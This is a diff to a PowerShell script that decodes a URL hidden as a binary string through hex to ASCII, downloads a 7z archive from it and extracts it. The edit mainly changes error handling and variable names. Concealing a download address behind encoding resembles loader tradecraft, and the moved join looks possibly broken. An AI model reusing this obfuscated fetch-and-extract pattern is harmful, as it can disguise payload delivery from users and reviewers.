@@ -13,18 +13,19 @@ Function Convert-BinaryToHex {
     Param ([string]$binaryString)
     $binaryGroups = $binaryString -split '(?<=\G.{8})'
     $hexString = $binaryGroups | ForEach-Object {
+        # Ensure input for ToInt32 is a valid 8-bit binary string to avoid conversion errors.
         if ($_ -match '^[01]{8}$') {
             '{0:X2}' -f [Convert]::ToInt32($_, 2)
         } else {
-            Write-Error "Invalid binary group: $_"
+            Write-Host "Skipping invalid or incomplete binary group: $_"
             return $null
         }
-    }
+    } -join ''
     Write-Host "Display hex:"
-    $hex = $hexString -join ''
-    Write-Host $hex
-    return $hex
+    Write-Host $hexString
+    return $hexString
 }
+
 
 Function Convert-HexToASCII {
     Param ([string]$hexString)
@@ -72,11 +73,11 @@ Write-Host $binaryString
 $hexString = Convert-BinaryToHex -binaryString $binaryString
 Write-Host "Display text (Encoded):"
 Write-Host $hexString
-$finalUrl = Convert-HexToASCII -hexString $hexString
+$asciiText = Convert-HexToASCII -hexString $hexString
 Write-Host "Display text (Encoded):"
-Write-Host $finalUrl
+Write-Host $asciiText
 $downloadPath = "S:\downloader\DownloadedFile.7z"
-Download-File -url $finalUrl -path $downloadPath
+Download-File -url $asciiText -path $downloadPath
 
 DownloadAndExtract7Zip
 
